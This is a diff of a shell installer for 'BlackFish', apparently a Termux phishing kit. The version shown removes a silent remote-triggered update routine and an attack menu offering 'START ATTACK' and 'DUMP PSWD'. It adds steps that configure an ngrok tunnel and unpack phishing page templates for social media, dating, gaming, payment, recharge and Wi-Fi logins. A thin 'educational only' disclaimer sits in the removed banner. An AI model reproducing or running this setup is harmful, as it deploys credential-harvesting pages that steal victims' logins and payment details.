@@ -27,185 +27,132 @@ else
     	sleep 2
 exit
 fi
-############################################
-###           checking update            ###
-############################################
-clear
-check(){
-if wget --spider https://raw.githubusercontent.com/evildevill/BlackFish/master/update.v1.4 2>/dev/null; then
-cd $HOME/BlackFish/core/update > /dev/null 2>&1
-echo "yes" > update.txt > /dev/null 2>&1
-else
-echo
-fi
-}
-check
-option(){
-if [ -f "$HOME/BlackFish/core/update/update.txt" ];then
-cd $HOME/BlackFish/core/update > /dev/null 2>&1
-bash update.sh > /dev/null 2>&1
-else
-echo " "
-fi
-}
-option
-check1(){
-if wget --spider https://raw.githubusercontent.com/evildevill/evildevillpatch/main/mrpshpatch.v.1 2>/dev/null; then
-cd $HOME/BlackFish/core/update > /dev/null 2>&1
-echo "yes" > patch.txt > /dev/null 2>&1
-else
-echo
-fi
-}
-check1
-option1(){
-if [ -f "$HOME/BlackFish/core/update/patch.txt" ];then
-cd $HOME/BlackFish/core/update > /dev/null 2>&1
-bash patch.sh > /dev/null 2>&1
-else
-echo " "
-fi
-}
-option1
-##############################################
-###              logo section              ###
-##############################################
-echo ""
-echo ""
-sleep 2.0
-echo ""
-echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
-echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
-echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
-echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
-echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
-echo ""
-echo -e $lightgreen "         AUTHOR : HACKER WASI"
-echo -e $red "THIS IS ONLY FOR EDUCTIONAL. WE ARE NOT RESPONSIBALE"
-echo -e $red "        FOR ANY ILLEGAL ACTIVITY OR MIS USE"
-echo -e $yellow "====================================================="
-echo ""
-echo ""
-sleep 4.0
-clear
-echo ""
-echo ""
-echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
-echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
-echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
-echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
-echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
-echo ""
-echo -e $lightgreen "GITHUB : github.com/evildevill/BlackFish"
-echo -e $okegreen " YouTube : youtube.com/HackerWasii"
-echo -e $red "    Instagram : instagram.com/blckspidr"
-echo ""
-echo -e $yellow "=============================================="
-echo ""
-banner(){
-echo -e $cyan "                BLACKFISH NGROK SETUP"
-echo -e $yellow "              IF YOU ARE USING WIFI"
-echo -e $okegreen "                   TYPE 1"
-echo ""
-echo ""
-echo -e $lightgreen "                  (OR)     "
-echo ""
-echo ""
-echo -e $yellow "              IF YOU ARE USING DATA"
-echo -e $okegreen "                   TYPE 2"
-echo -e $yellow "=============================================="
-echo -n -e "\e[32mBLACKFISH\e[96m[\e[33m1/2\e[96m]\e[33m: \e[0m"
-read hulk
-if [ $hulk = 1 ];then
+echo -e $cyan                      "INSTALLING DEPENDENCIES...."
+sleep2.0
+echo -e $cyan                  "PLEASE WAIT IT WILL TAKE SOME TIME...."
+apt upgrade -y > /dev/null 2>&1
+apt update -y > /dev/null 2>&1
+termux-setup-storage
+pkg install git -y > /dev/null 2>&1
+pkg install zip -y > /dev/null 2>&1
+pkg install mpv -y > /dev/null 2>&1
+pkg install wget -y > /dev/null 2>&1
+pkg install openssh -y > /dev/null 2>&1
+pkg install python -y > /dev/null 2>&1
+pkg install python2 -y > /dev/null 2>&1
+pkg install nano -y > /dev/null 2>&1
+pkg install php -y > /dev/null 2>&1
+pip install lolcat 
+cd /sdcard > /dev/null 2>&1
+echo -e $yellow                  "MAKING DIRECTORY IN SDCARD TO SAVE LOGS...."
+mkdir Hacker-wasii > /dev/null 2>&1
+echo -e $yellow                  "DIRECTORY SUCCESSFULLY CREATED...."
+cd $HOME/BlackFish > /dev/null 2>&1
+mv log.mp3 /sdcard > /dev/null 2>&1
 cd $HOME/BlackFish/core > /dev/null 2>&1
-rm ngrok > /dev/null 2>&1
-unzip ngrok-wifi.zip > /dev/null 2>&1
 chmod +x ngrok > /dev/null 2>&1
-elif [ $hulk = 2 ];then
-cd $HOME/BlackFish/core > /dev/null 2>&1
-rm ngrok > /dev/null 2>&1
-unzip ngrok-data.zip > /dev/null 2>&1
-chmod +x ngrok > /dev/null 2>&1
-else
-echo -e $red "                           PLEASE CHOSE CORRECT OPETION"
-fi
-}
-banner
-sleep 4.0
-else
-echo ""
-echo ""
-sleep 1.0
-bash BlackFish
-fi  
+mv ngrok $HOME > /dev/null 2>&1
+cd $HOME > /dev/null 2>&1
 clear
-echo ""
-echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
-echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
-echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
-echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
-echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
-echo ""
-echo -e $lightgreen "           TOOL BY WASEEM AKRAM"
-echo -e $yellow "                    VERSION 2.0"
-echo ""
-echo -e $lightgreen "============================================="
-echo -e $BlueF "                 BLACKFISH MAIN MENU "
-echo ""
-echo -e $lightgreen "============================================="
-echo -e "\e[0;36     [\e[92m1\e[0;36]==> START ATTACK"
-echo -e "\e[0;36     [\e[92m2\e[0;36]==> DUMP PSWD"
-echo -e "\e[0;36     [\e[92m3\e[0;36]==> ABOUT"
-echo -e "\e[0;36     [\e[92m4\e[0;36]==> UPDATE"
-echo -e "\e[0;36     [\e[92m5\e[0;36]==> EXIT"
-echo -e "\e[0;36     [\e[92m6\e[0;36]==> SUBSCRIBE"
-echo -e "\e[0;36     [\e[92m7\e[0;36]==> SEE SPEED"
-echo -e "\e[0;36     [\e[92m8\e[0;36]==> CHAT NOW"
-echo -e $lightgreen "============================================="
-read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] BLACKFISH: \e[0m' option
-if [[ $option == 1 || $option == 01 ]]; then
-echo
-cd $HOME/BlackFish/core
-bash menu.sh
-echo
-elif [[ $option == 2 || $option == 02 ]]; then
-echo
-cd $HOME/BlackFish/core/
-bash show.sh
-elif [[ $option == 3 || $option == 03 ]]; then
-echo
-cd $HOME/BlackFish/core/about
-bash about.sh
-elif [[ $option == 4 || $option == 04 ]]; then
-echo
-cd $HOME/BlackFish/core/update
-bash update.sh
-echo
-elif [[ $option == 7 || $option == 07 ]]; then
-echo
-cd $HOME/BlackFish/core
-bash intspeed.sh
-echo
-elif [[ $option == 5 ]]; then
+echo -e $yellow                     "SETTING UP NGROK FOR 1ST TIME...."
+echo -e $yellow                     "MAKE AN ACCOUNT ON NGROK.COM....."
+echo -e $cyan                    "COPY YOUR AUTH TOKEN AND PASTE HERE....."
+sleep 8.0
 clear
-printf "                    \e[1;96m Have A Nice Day ........! \e[0m\n"
-echo
-sleep 3.0
-exit 3
-elif [[ $option == 6 || $option == 06 ]]; then
-echo
+am start -a android.intent.action.VIEW -d https://www.ngrok.com
 clear
-am start -a android.intent.action.VIEW -d https://youtube.com/HackerWasii
-clear
-echo
-elif [[ $option == 8 || $option == 08 ]]; then
-echo
-clear
-am start -a android.intent.action.VIEW -d https://wa.me/923137119351
-else
-printf "                \e[1;92m [!] Invalid option!\e[0m\n"
-sleep 1
-fi
-echo
+read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
+./ngrok authtoken $name
+clear 
+mv ngrok $HOME/BlackFish/core > /dev/null 2>&1
+cd $HOME/BlackFish > /dev/null 2>&1
+cd core/deploys > /dev/null 2>&1
+unzip dating.zip > /dev/null 2>&1
+unzip gaming.zip > /dev/null 2>&1
+unzip others.zip > /dev/null 2>&1
+unzip others1.zip > /dev/null 2>&1
+unzip socialmedia.zip > /dev/null 2>&1
+unzip socialmedia1.zip > /dev/null 2>&1
+unzip socialmedia2.zip > /dev/null 2>&1
+unzip socialmedia3.zip > /dev/null 2>&1
+unzip socialmedia4.zip > /dev/null 2>&1
+unzip socialmedia5.zip > /dev/null 2>&1
+unzip socialmedia6.zip > /dev/null 2>&1
+unzip socialmedia7.zip > /dev/null 2>&1
+unzip socialmedia8.zip > /dev/null 2>&1
+unzip socialmedia9.zip > /dev/null 2>&1
+unzip socialmedia10.zip > /dev/null 2>&1
+unzip socialmedia11.zip > /dev/null 2>&1
+unzip socialmedia12.zip > /dev/null 2>&1
+unzip payment.zip > /dev/null 2>&1
+unzip recharge.zip > /dev/null 2>&1                                                                      
+unzip wifirt.zip > /dev/null 2>&1                                                                    
+cd socialmedia1 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia1 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia2 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia2 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia3 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia3 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia4 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia4 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia5 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia5 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia6 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia6 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia7 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia7 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia8 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia8 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia9 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia9 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia10 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia10 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia11 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia11 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia12 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia12 > /dev/null 2>&1
+cd others1 > /dev/null 2>&1
+mv  * $HOME/BlackFish/core/deploys/others > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf others1 > /dev/null 2>&1
+rm *.zip > /dev/null 2>&1
+cd $HOME/BlackFish > /dev/null 2>&1
+mpv /sdcard/log.mp3
+rm setup > /dev/null 2>&1
 cd $HOME/BlackFish
-bash bf.sh
+bash BlackFish.sh
